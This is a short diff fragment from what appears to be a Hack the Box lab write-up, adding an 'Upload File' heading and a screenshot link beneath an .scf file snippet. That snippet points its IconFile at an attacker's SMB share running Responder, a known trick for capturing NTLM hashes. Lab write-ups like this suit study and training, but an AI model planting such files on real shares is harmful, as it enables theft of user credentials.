@@ -127,6 +127,9 @@ IconFile=\\10.10.14.14\tools\responder.ico
 Command=ToggleDesktop
 ```
 
+Upload File
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/67073226-d33c-4442-8199-8c489f76d602)
+
 
 
 SMB Enumeration
